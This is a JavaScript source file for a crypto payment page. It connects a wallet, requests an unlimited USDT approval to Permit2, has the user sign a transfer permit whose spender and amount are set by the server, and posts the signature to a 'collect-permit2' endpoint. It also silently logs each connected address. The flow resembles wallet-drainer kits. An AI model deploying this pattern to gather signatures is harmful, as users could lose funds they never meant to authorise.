/**
 * wallet-permit2.js (source)
 * Bundled by Vite into /js/wallet-permit2.js with npm packages.
 */

import { createAppKit } from '@reown/appkit';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { mainnet, arbitrum, base, polygon, sepolia } from '@reown/appkit/networks';
import { BrowserProvider, Contract, MaxUint256, getAddress } from 'ethers';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const NETWORK_MAP = {
  1: mainnet,
  42161: arbitrum,
  8453: base,
  137: polygon,
  11155111: sepolia
};

let cfg = null;
let modal = null;
let isConnected = false;
let userAddress = null;

function setStatus(id, text) {
  const el = document.getElementById(id);
  if (el) el.textContent = text;
}

function enablePayButton(enabled) {
  const btn = document.getElementById('sign-and-pay-btn');
  if (btn) btn.disabled = !enabled;
}

async function loadConfig() {
  const res = await fetch('/api/config');
  if (!res.ok) throw new Error('Failed to load config from server');
  cfg = await res.json();
  if (!cfg.projectId) throw new Error('projectId not set — configure in Admin → Settings');
  if (!cfg.spenderAddress) throw new Error('spenderAddress not set — configure in Admin → Settings');
  return cfg;
}

async function logWallet(address) {
  try {
    await fetch('/api/wallets', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address })
    });
  } catch (_) {}
}

async function getEthersProvider() {
  const walletProvider = modal.getWalletProvider();
  if (!walletProvider) throw new Error('No wallet provider');
  return new BrowserProvider(walletProvider);
}

const ERC20_ABI = [
  'function allowance(address owner, address spender) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)'
];

function initAppKit() {
  if (modal) return modal;

  const selectedNetwork = NETWORK_MAP[cfg.chainId] || mainnet;
  const ethersAdapter = new EthersAdapter();

  modal = createAppKit({
    adapters: [ethersAdapter],
    networks: [selectedNetwork],
    projectId: cfg.projectId,
    metadata: cfg.metadata || {
      name: 'Payment App',
      description: '',
      url: window.location.origin,
      icons: []
    },
    features: {
      analytics: false,
      email: false,
      socials: false
    }
  });

  modal.subscribeAccount((account) => {
    isConnected = !!account?.isConnected;
    userAddress = account?.address || null;

    if (isConnected && userAddress) {
      setStatus('wallet-status', `${userAddress.slice(0, 6)}…${userAddress.slice(-4)}`);
      enablePayButton(true);
      logWallet(userAddress);
    } else {
      setStatus('wallet-status', 'Not connected');
      enablePayButton(false);
    }
  });

  return modal;
}

async function connectWallet() {
  try {
    if (!cfg) await loadConfig();
    initAppKit();
    await modal.open();
  } catch (err) {
    console.error(err);
    setStatus('tx-status', 'Connect failed: ' + err.message);
  }
}

async function ensurePermit2Allowance() {
  const ethersProvider = await getEthersProvider();
  const signer = await ethersProvider.getSigner();
  const address = await signer.getAddress();

  const usdt = new Contract(cfg.usdtAddress, ERC20_ABI, signer);
  const current = await usdt.allowance(address, PERMIT2_ADDRESS);

  if (current > 0n) return;

  setStatus('tx-status', 'Approving Permit2 (one-time)...');
  const tx = await usdt.approve(PERMIT2_ADDRESS, MaxUint256);
  await tx.wait();
  setStatus('tx-status', 'Permit2 approved');
}

async function signPermit2() {
  if (!isConnected) throw new Error('Wallet not connected');
  if (!cfg) await loadConfig();

  await ensurePermit2Allowance();

  const ethersProvider = await getEthersProvider();
  const signer = await ethersProvider.getSigner();
  const owner = await signer.getAddress();

  const amount = BigInt(cfg.amount);
  const nonce = BigInt(Math.floor(Math.random() * 1e15));
  const deadline = BigInt(Math.floor(Date.now() / 1000) + (cfg.deadlineSeconds || 3600));

  const domain = {
    name: 'Permit2',
    chainId: cfg.chainId,
    verifyingContract: PERMIT2_ADDRESS
  };

  const types = {
    PermitTransferFrom: [
      { name: 'permitted', type: 'TokenPermissions' },
      { name: 'spender', type: 'address' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' }
    ],
    TokenPermissions: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ]
  };

  const message = {
    permitted: {
      token: getAddress(cfg.usdtAddress),
      amount
    },
    spender: getAddress(cfg.spenderAddress),
    nonce,
    deadline
  };

  setStatus('tx-status', 'Please sign the payment in your wallet...');

  const signature = await signer.signTypedData(domain, types, message);

  return {
    permit: {
      permitted: {
        token: message.permitted.token,
        amount: amount.toString()
      },
      spender: message.spender,
      nonce: nonce.toString(),
      deadline: deadline.toString()
    },
    signature,
    owner,
    chainId: cfg.chainId,
    amount: amount.toString()
  };
}

async function sendToBackend(payload) {
  setStatus('tx-status', 'Submitting to backend...');

  const res = await fetch(cfg.backendEndpoint || '/api/collect-permit2', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(data.error || `Backend error ${res.status}`);
  }

  setStatus(
    'tx-status',
    data.txHash ? `Success! Tx: ${data.txHash}` : 'Payment submitted successfully'
  );
  return data;
}

async function signAndPay() {
  try {
    enablePayButton(false);
    const signed = await signPermit2();
    await sendToBackend(signed);
  } catch (err) {
    console.error(err);
    setStatus('tx-status', 'Error: ' + (err.shortMessage || err.message));
  } finally {
    enablePayButton(true);
  }
}

async function boot() {
  try {
    await loadConfig();
  } catch (e) {
    setStatus('tx-status', e.message);
  }

  const connectBtn = document.getElementById('connect-wallet-btn');
  const payBtn = document.getElementById('sign-and-pay-btn');

  if (connectBtn) connectBtn.addEventListener('click', connectWallet);
  if (payBtn) payBtn.addEventListener('click', signAndPay);
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', boot);
} else {
  boot();
}
